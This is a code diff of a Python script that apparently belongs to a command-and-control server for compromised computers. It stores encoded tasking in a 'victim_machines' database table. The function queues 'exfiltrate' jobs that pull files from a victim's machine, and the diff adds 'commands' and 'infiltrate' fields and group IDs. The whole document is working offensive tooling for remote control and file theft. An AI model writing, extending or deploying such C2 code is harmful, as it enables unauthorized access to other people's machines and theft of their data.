@@ -21,6 +21,7 @@ def encode ( input ):
 	return encoded_updated
 
 def downloadfile( id, file_path, file_name ):
+	#FILE_PATH IS ON VICTIM MACHINE, FILE_NAME IS WHERE TO STORE IT LOCALLY
 
 	#base query to check whether or not the id requested appears in the database
 	query = """ SELECT command, file_names FROM victim_machines WHERE victim_id =%s """
@@ -46,7 +47,7 @@ def downloadfile( id, file_path, file_name ):
 			json_data = json.loads(decoded_command)
 			seconds_from_epoch = int(time.time())
 			new_command = {str(seconds_from_epoch): file_path}
-			json_data["download_files"].update(new_command)
+			json_data["exfiltrate"].update(new_command)
 #			print(json.dumps(json_data))
 
 			json_string = str(json.dumps(json_data))
@@ -77,14 +78,15 @@ def downloadfile( id, file_path, file_name ):
 			print("id not found in the database")
 			print("creating new entry in database...")
 			seconds_from_epoch = int(time.time())
-			empty_command_output = "{}"
-			formatted_command = "{\"exec_commands\": {}, \"download_files\":{\"" + str(seconds_from_epoch) + "\": \"" + file_path + "\"}}"
+			default_group_id = 1
+			empty_command_output = "e30="
+			formatted_command = "{\"commands\": {}, \"exfiltrate\":{\"" + str(seconds_from_epoch) + "\": \"" + file_path + "\"}, \"infiltrate\": {}}"
 			formatted_encoded = encode(formatted_command)
 			custom_filename = "{\"" + seconds_from_epoch + "\": \"" + file_name + "\"}"
 			encoded_custom_filename = encode(custom_filename)
 
-			create_query = """ INSERT INTO victim_machines (victim_id, command, command_output, command_record, file_names) VALUES (%s, %s, %s, %s, %s) """
-			create_data = (id, formatted_encoded,empty_command_output, formatted_encoded, encoded_custom_filename)
+			create_query = """ INSERT INTO victim_machines (victim_id, group_id, command, command_output, command_record, file_names) VALUES (%s, %s, %s, %s, %s, %s) """
+			create_data = (id, default_group_id, formatted_encoded,empty_command_output, formatted_encoded, encoded_custom_filename)
 
 			cursor.execute(create_query, create_data)
 
@@ -100,4 +102,4 @@ def downloadfile( id, file_path, file_name ):
 	return True
 
 if __name__ == "__main__":
-	editcommand(*sys.argv[1:])
+	downloadfile(*sys.argv[1:])
